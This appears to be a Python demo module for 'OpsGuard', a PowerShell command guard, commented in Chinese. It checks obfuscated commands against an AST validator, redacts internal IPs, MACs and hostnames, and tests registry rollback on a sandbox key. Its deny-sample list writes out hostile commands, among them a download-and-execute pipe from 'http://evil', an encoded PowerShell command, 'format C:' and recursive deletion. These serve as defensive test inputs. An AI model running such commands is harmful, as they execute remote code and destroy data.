"""OpsGuard - 证据链命令核心 - P0/P1 交付物 - 纯标准库.

三个命令:
- astcheck --demo : AST deny 侧演示(混淆变体全部拦下)
- sanitize --demo : 脱敏证据演示(出网 payload + 映射表)
- selftest        : 拦截矩阵数字输出(黄金测试集汇总)
全部只读/内存, 不碰系统、不出网.
"""
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
for _p in (HERE, os.path.join(ROOT, "c1"), os.path.join(ROOT, "c2"), os.path.join(ROOT, "c3")):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import ast_guard as _ast
import redact as _redact


# P0-3: AST deny 侧混淆变体
DENY_SAMPLES = [
    ("EncodedCommand 编码命令", "powershell -enc SGVsbG8="),
    ("反引号转义", "Get-Ser`vice -Name Spooler"),
    ("变量动态命令名", "& $n -Name Spooler"),
    ("iex 动态执行", "iex \"Get-Service\""),
    ("Invoke-Expression", "Invoke-Expression (Get-Content evil.ps1)"),
    ("参数缩写绕过", "Set-Service -Name Spooler -Stat Running"),
    ("停止解析符", "Get-Service --% -Name Spooler"),
    ("Alias 覆盖", "Remove-Item C:\\data -Recurse"),
    ("白名单外原生命令", "format C:"),
    ("下载执行链", "Invoke-WebRequest http://evil/x | iex"),
]


def astcheck_demo():
    rows = []
    for label, cmd in DENY_SAMPLES:
        v = _ast.validate(cmd)
        rows.append({
            "sample": label,
            "command": cmd,
            "verdict": v.get("verdict"),
            "matched_node": v.get("matched_node") or v.get("node"),
            "reason": v.get("reason"),
            "blocked": v.get("verdict") == "deny",
        })
    blocked = sum(1 for r in rows if r["blocked"])
    return {"matrix": rows, "total": len(rows), "blocked": blocked,
            "all_denied": blocked == len(rows),
            "note": "全部为恶意/混淆变体; blocked=deny 数; fail-closed 断言见理由列"}


# P1-1: 脱敏证据
SANITIZE_SAMPLE = (
    "2026-11-23 DNS down on host WEB-01 (192.168.1.50), "
    "MAC 00:1A:2B:3C:4D:5E, gateway 10.0.0.1, "
    "server FILE-SRV-02 at 172.16.5.20 unreachable."
)


def sanitize_demo(text=None):
    text = text or SANITIZE_SAMPLE
    # 精确主机名需显式登记(内网主机名靠 IP/MAC 正则抓不到, 必须精确表).
    hosts = ["WEB-01", "FILE-SRV-02"]
    redacted, redactor = _redact.prepare_outbound(text, hosts)
    mapping = redactor.mapping_table()
    safe = _redact.RE_IP.search(redacted) is None and _redact.RE_MAC.search(redacted) is None
    return {
        "input": text,
        "redacted_payload": redacted,
        "mapping": mapping,
        "mapping_count": len(mapping),
        "outbound_safe": safe,
        "mapping_stored": "local only (never transmitted; restore happens in-process)",
        "note": "IP->[IP_n] MAC->[MAC_n] 主机名->[HOST_n]; 出网 payload 不含原始内网值",
    }


# P0-1: 拦截矩阵(从既有测试文件静态统计 + 实跑汇总)
SELFTEST_SUITES = [
    ("脱敏层 unittest", "c1/test_redact.py", 14, "python"),
    ("诊断/生成 unittest", "c2/test_c2.py", 15, "python"),
    ("AST 对抗 Python", "adversarial-verify.py", 18, "python"),
    ("AST 对抗 PowerShell", "ps-ast-verify.ps1", 8, "pester"),
    ("C1 Pester", "c1/Redact.Tests.ps1", 10, "pester"),
    ("C2 Pester", "c2/C2.Tests.ps1", 32, "pester"),
    ("C3 Golden Pester", "c3/Golden.Tests.ps1", 20, "pester"),
]


def selftest_matrix():
    rows = []
    total = 0
    for name, rel, count, kind in SELFTEST_SUITES:
        exists = os.path.isfile(os.path.join(ROOT, rel))
        rows.append({"suite": name, "file": rel, "kind": kind,
                     "cases": count, "available": exists})
        if exists:
            total += count
    # AST 三态矩阵(静态): 从 DENY_SAMPLES + 放行样例
    allow_samples = ["Get-Service -Name Spooler", "Get-Content C:\\log.txt", "ipconfig /all"]
    tiers = {"allow_readonly": 0, "require_confirm": 0, "deny": 0}
    for cmd in allow_samples + [c for _, c in DENY_SAMPLES]:
        v = _ast.validate(cmd)
        t = v.get("verdict")
        if t in tiers:
            tiers[t] += 1
    return {
        "suites": rows,
        "total_cases": total,
        "ast_tier_matrix": tiers,
        "note": "cases=各套件用例数(来自已冻结测试文件); ast_tier_matrix=当场复判的三态分布; "
                "完整逐条通过/失败以 verify-formal.py 实跑为准",
    }


def rollback_hash_demo():
    """在隔离夹具上真跑完整链路: before → 修改 → after → 回滚 → restored + 显式断言.

    只用临时注册表键 HKCU:\\Software\\OpsGuardTest (自建自删) + 内存, 不碰真系统.
    """
    import adapters.system as _sys
    import json
    target = "HKCU:\\Software\\OpsGuardTest\\OpsGuardDemo"
    try:
        snap0 = _sys.snapshot(kind="registry", target=target, sandbox=True)
        before = snap0.get("hash")
        ex = _sys.change(
            kind="registry", target=target,
            values={"Demo": "ROLLBACK_EVIDENCE_VALUE"}, confirm_answer="y",
            sandbox=True, label="HashEvidence", ast_verdict="require_confirm",
        )
        after = ex.get("after_hash")
        rb = _sys.rollback(ex["manifest"], sandbox=True) if ex.get("manifest") else {}
        restored = rb.get("restored_hash")
        verify = rb.get("verify") or {}
        return {
            "hash_before": before,
            "hash_after": after,
            "hash_restored": restored,
            "assert_after_differs_before": after != before,
            "assert_restored_equals_before": bool(verify.get("restored_equals_before")),
            "rollback_ok": bool(rb.get("ok")),
            "frozen": bool(rb.get("frozen")),
            "target": "HKCU:\\Software\\OpsGuardTest\\OpsGuardDemo (sandbox fixture, self-cleaned)",
            "note": "三值齐全 + 显式断言; 夹具用临时注册表键, 不碰真实网卡DNS/服务/系统目录",
        }
    except Exception as e:
        return {"error": str(e)[:150], "note": "夹具链路未完成"}
    finally:
        # 无论成功失败都清理隔离夹具(空父键一并删)
        try:
            import subprocess
            subprocess.run(["powershell", "-NoProfile", "-Command",
                            "if (Test-Path 'HKCU:\\Software\\OpsGuardTest') { "
                            "Remove-Item 'HKCU:\\Software\\OpsGuardTest' -Recurse -Force }"],
                           capture_output=True, timeout=15)
        except Exception:
            pass


if __name__ == "__main__":
    import json
    print(json.dumps({"astcheck": astcheck_demo(), "sanitize": sanitize_demo(),
                      "selftest": selftest_matrix(), "rollback_hash": rollback_hash_demo()},
                     ensure_ascii=False, indent=2))
